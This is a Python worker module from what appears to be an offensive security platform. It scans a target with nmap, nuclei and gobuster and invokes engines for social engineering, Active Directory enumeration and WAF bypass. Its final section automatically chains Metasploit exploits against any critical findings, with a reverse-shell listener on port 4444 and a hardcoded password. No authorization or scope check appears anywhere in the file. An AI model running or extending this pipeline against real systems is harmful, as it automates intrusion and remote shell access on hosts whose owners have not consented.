import time
import logging
import gc
import subprocess
import os
import tempfile
from urllib.parse import urlparse
from cyberapp.models.db import db_conn
from cybermodules.social_engineering import GhostEngine
from cybermodules.arsenal import SupremeArsenalEngine
from cybermodules.ad_enum import ActiveDirectoryEnum
from cybermodules.waf_bypass import WAFBypassEngine
from cybermodules.llm_engine import LLMEngine
from cybermodules.gamification import GamificationEngine
from cybermodules.autoexploit import AutoExploitEngine
from cyberapp.services.progress import update_scan_progress


def _run_tool_direct(tool_name, cmd, timeout=600):
    """Run a tool directly and return output"""
    try:
        fd, out = tempfile.mkstemp(prefix=f'{tool_name}_', suffix='.txt')
        os.close(fd)
        
        result = subprocess.run(
            cmd,
            stdout=open(out, 'w'),
            stderr=subprocess.STDOUT,
            timeout=timeout
        )
        
        with open(out, 'r') as f:
            return out, f.read()
    except subprocess.TimeoutExpired:
        with open(out, 'a') as f:
            f.write('\n[ERROR] Timeout')
        return out, ""
    except Exception as e:
        return None, str(e)


def _log_tool_output(scan_id, tool_name, output):
    """Log tool output to database"""
    try:
        with db_conn() as conn:
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (scan_id, tool_name, output[:5000] if output else "No output"),
            )
            conn.commit()
    except Exception:
        pass


def _parse_nmap_output(output):
    """Parse Nmap output for open ports and services"""
    findings = []
    if not output:
        return findings
    
    for line in output.split('\n'):
        if 'open' in line and 'tcp' in line:
            findings.append(line.strip())
            
            # Try to extract port number
            import re
            port_match = re.search(r'(\d+)/tcp', line)
            if port_match:
                port = port_match.group(1)
                # Log as intel
                try:
                    with db_conn() as conn:
                        conn.execute(
                            "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                            (None, "NMAP_PORT", f"Open port: {line.strip()}"),
                        )
                        conn.commit()
                except Exception:
                    pass
    return findings


def _parse_nuclei_output(output, scan_id):
    """Parse Nuclei output for vulnerabilities"""
    if not output:
        return
    
    critical_count = output.count('[critical]')
    high_count = output.count('[high]')
    medium_count = output.count('[medium]')
    
    if critical_count > 0 or high_count > 0 or medium_count > 0:
        try:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                    (scan_id, "NUCLEI_FINDINGS", f"Critical: {critical_count}, High: {high_count}, Medium: {medium_count}"),
                )
                conn.commit()
        except Exception:
            pass
    
    # Parse individual findings
    import re
    for match in re.finditer(r'\[([^\]]+)\]\s+(https?://[^\s]+)', output):
        severity, url = match.groups()
        severity = severity.upper()
        
        # Map nuclei severity to our severity
        if severity in ['CRITICAL']:
            our_severity = 'CRITICAL'
        elif severity in ['HIGH']:
            our_severity = 'HIGH'
        elif severity in ['MEDIUM']:
            our_severity = 'MEDIUM'
        else:
            our_severity = 'MEDIUM'
        
        try:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO vulns (scan_id, type, url, fix, severity) VALUES (?, ?, ?, ?, ?)",
                    (scan_id, f"NUCLEI_{severity}", url, "", our_severity),
                )
                conn.commit()
        except Exception:
            pass


def _parse_gobuster_output(output):
    """Parse Gobuster output for found directories"""
    findings = []
    if not output:
        return findings
    
    for line in output.split('\n'):
        if ('Status:' in line) and ('200' in line or '301' in line or '302' in line):
            findings.append(line.strip())
    return findings


def run_worker(target, scan_id, run_python, selected_tools, user_id="anonymous"):
    try:
        start_time = time.time()
        update_scan_progress(scan_id, 5, _eta(start_time, 5))

        with db_conn() as conn:
            conn.execute(
                "UPDATE scans SET status = 'GHOST ENGINE 🕵️', user_id = ? WHERE id = ?",
                (user_id, scan_id),
            )
            conn.commit()

        # === GHOST ENGINE (Python-based scanner) ===
        if run_python:
            try:
                ghost = GhostEngine(target, scan_id)
                ghost.start()
                update_scan_progress(scan_id, 25, _eta(start_time, 25))
            except Exception as e:
                _log_tool_output(scan_id, "GHOST_ENGINE", f"Error: {str(e)[:200]}")

        # === DIRECT TOOL EXECUTION (without Celery) ===
        if selected_tools:
            with db_conn() as conn:
                conn.execute("UPDATE scans SET status = 'ARSENAL ⚔️' WHERE id = ?", (scan_id,))
                conn.commit()

            # Nmap
            if "nmap" in selected_tools:
                try:
                    nmap_path = os.getenv('NMAP_BIN', 'nmap')
                    if os.path.exists(nmap_path.split()[0] if ' ' in nmap_path else nmap_path):
                        out_file, output = _run_tool_direct(
                            "nmap",
                            [nmap_path, "-sV", "-sC", "-O", "-T4", target],
                            timeout=300
                        )
                        _log_tool_output(scan_id, "NMAP", output)
                        
                        # Parse and log findings
                        ports = _parse_nmap_output(output)
                        if ports:
                            _log_tool_output(scan_id, "NMAP_PORTS", f"Found {len(ports)} open ports")
                    else:
                        _log_tool_output(scan_id, "NMAP", "Nmap not found in system")
                except Exception as e:
                    _log_tool_output(scan_id, "NMAP_ERROR", str(e)[:200])

            # Nuclei
            if "nuclei" in selected_tools:
                try:
                    nuclei_path = os.getenv('NUCLEI_BIN', 'nuclei')
                    if os.path.exists(nuclei_path.split()[0] if ' ' in nuclei_path else nuclei_path):
                        out_file, output = _run_tool_direct(
                            "nuclei",
                            [nuclei_path, "-u", target, "-severity", "critical,high,medium"],
                            timeout=600
                        )
                        _log_tool_output(scan_id, "NUCLEI", output)
                        
                        # Parse and log vulnerabilities
                        _parse_nuclei_output(output, scan_id)
                    else:
                        _log_tool_output(scan_id, "NUCLEI", "Nuclei not found in system")
                except Exception as e:
                    _log_tool_output(scan_id, "NUCLEI_ERROR", str(e)[:200])

            # Gobuster
            if "gobuster" in selected_tools:
                try:
                    gobuster_path = os.getenv('GOBUSTER_BIN', 'gobuster')
                    wordlist = "/usr/share/wordlists/dirb/common.txt"
                    if os.path.exists("/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt"):
                        wordlist = "/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt"
                    
                    if os.path.exists(gobuster_path.split()[0] if ' ' in gobuster_path else gobuster_path):
                        out_file, output = _run_tool_direct(
                            "gobuster",
                            [gobuster_path, "dir", "-u", target, "-w", wordlist, "-x", "php,html,aspx,jsp"],
                            timeout=600
                        )
                        _log_tool_output(scan_id, "GOBUSTER", output)
                        
                        # Parse directories
                        dirs = _parse_gobuster_output(output)
                        if dirs:
                            _log_tool_output(scan_id, "GOBUSTER_DIRS", f"Found {len(dirs)} accessible paths")
                    else:
                        _log_tool_output(scan_id, "GOBUSTER", "Gobuster not found in system")
                except Exception as e:
                    _log_tool_output(scan_id, "GOBUSTER_ERROR", str(e)[:200])

            # Run SupremeArsenalEngine for other tools
            try:
                arsenal = SupremeArsenalEngine(target, scan_id, selected_tools)
                arsenal.start()
            except Exception as e:
                _log_tool_output(scan_id, "ARSENAL", f"Error: {str(e)[:200]}")

            update_scan_progress(scan_id, 60, _eta(start_time, 60))

            # Additional tools
            if "ad_enum" in selected_tools:
                try:
                    ad = ActiveDirectoryEnum(target.replace("http://", "").replace("https://", ""), scan_id)
                    ad.start()
                except Exception as e:
                    _log_tool_output(scan_id, "AD_ENUM", f"Error: {str(e)[:200]}")

            if "waf_bypass" in selected_tools:
                try:
                    waf = WAFBypassEngine(target, scan_id)
                    waf.start()
                except Exception as e:
                    _log_tool_output(scan_id, "WAF_BYPASS", f"Error: {str(e)[:200]}")

            if "llm_analysis" in selected_tools:
                try:
                    llm = LLMEngine(scan_id)
                    with db_conn() as conn:
                        vulns = conn.execute(
                            "SELECT type, url FROM vulns WHERE scan_id=?", (scan_id,)
                        ).fetchall()
                        for v in vulns:
                            try:
                                analysis = llm.analyze_vuln(v[0], v[1])
                                conn.execute(
                                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                                    (scan_id, "LLM_ANALIZ", analysis),
                                )
                            except Exception:
                                pass
                        conn.commit()
                except Exception as e:
                    _log_tool_output(scan_id, "LLM_ANALYSIS", f"Error: {str(e)[:100]}")

        update_scan_progress(scan_id, 80, _eta(start_time, 80))

        execution_time = time.time() - start_time

        with db_conn() as conn:
            critical_vulns = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR')",
                (scan_id,),
            ).fetchone()[0]

            if critical_vulns > 0:
                conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅ 🔴 AÇIK VAR' WHERE id = ?", (scan_id,))
            else:
                conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅' WHERE id = ?", (scan_id,))

            conn.execute(
                "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                (scan_id, "EXECUTION_TIME", f"Total execution: {execution_time:.2f} seconds"),
            )
            conn.commit()

        update_scan_progress(scan_id, 100, 0)

        if "gamification" in selected_tools:
            try:
                game = GamificationEngine(scan_id, user_id)
                game.calculate_score()
            except Exception as e:
                _log_tool_output(scan_id, "GAMIFICATION", f"Error: {str(e)[:100]}")

        # === OTOMATİK METASPLOIT EXPLOIT CHAINING ===
        try:
            logging.info("[AUTO EXPLOIT] Kritik zafiyet kontrolü ve otomatik exploit başlatılıyor...")

            # <<< BURAYI DEĞİŞTİR! Kendi listener IP'ni yaz >>>
            LHOST = "192.168.1.100"  # tun0 veya VPN IP'n

            engine = AutoExploitEngine(password='rascal123')

            with db_conn() as conn:
                critical_rows = conn.execute(
                    """
                    SELECT type, url
                    FROM vulns
                    WHERE scan_id = ?
                      AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'CRITICAL', 'HIGH')
                    """,
                    (scan_id,),
                ).fetchall()

            if not critical_rows:
                logging.info("[AUTO EXPLOIT] Detaylı kritik kayıt bulunamadı, geçiliyor.")
            else:
                findings = []
                for row in critical_rows:
                    vuln_type = row[0]
                    vuln_url = row[1] or ""
                    parsed = urlparse(vuln_url) if vuln_url else None
                    host = ""
                    port = None
                    if parsed and parsed.netloc:
                        host = parsed.hostname or ""
                        port = parsed.port
                    if not host:
                        host = target.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0]
                    if not port:
                        port = 445 if "smb" in str(vuln_type).lower() else 80

                    finding = {
                        'ip': host,
                        'port': port,
                        'cve': None,
                        'name': vuln_type,
                        'service': vuln_type.lower().replace('_', ' ')
                    }
                    findings.append(finding)

                logging.info(f"[AUTO EXPLOIT] {len(findings)} kritik zafiyet için exploit denenecek.")

                exploit_results = engine.auto_chain_from_findings(findings=findings, lhost=LHOST, lport=4444)

                success_count = 0
                for res in exploit_results:
                    if res.get('status') == 'success':
                        success_count += 1
                        session_id = res.get('session_id')
                        module = res.get('exploit_module', 'Bilinmiyor')
                        logging.info(f"[+] SESSION AÇILDI! ID: {session_id} | Module: {module}")

                        with db_conn() as conn:
                            conn.execute(
                                "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                                (scan_id, "EXPLOIT_SUCCESS", f"Session {session_id} → {module}"),
                            )
                            conn.commit()
                    else:
                        logging.warning(f"[~] Exploit başarısız: {res.get('query', 'N/A')} → {res.get('status')}")

                if success_count > 0:
                    with db_conn() as conn:
                        conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅ 🔴 SESSION AÇILDI' WHERE id = ?", (scan_id,))
                        conn.commit()

        except Exception as auto_e:
            logging.error(f"[AUTO EXPLOIT HATA] {str(auto_e)}", exc_info=True)
            _log_tool_output(scan_id, "AUTOEXPLOIT_AUTO", f"Error: {str(auto_e)[:150]}")

    except Exception as e:
        with db_conn() as conn:
            conn.execute("UPDATE scans SET status = 'HATA ❌' WHERE id = ?", (scan_id,))
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (scan_id, "SYSTEM_ERROR", f"Worker error: {str(e)[:200]}"),
            )
            conn.commit()
        update_scan_progress(scan_id, 100, 0)

    finally:
        try:
            gc.collect()
        except Exception:
            pass


def _eta(start_time, progress):
    if progress <= 0:
        return None
    elapsed = time.time() - start_time
    remaining = max(0, 100 - progress)
    return int((elapsed / max(progress, 1)) * remaining)
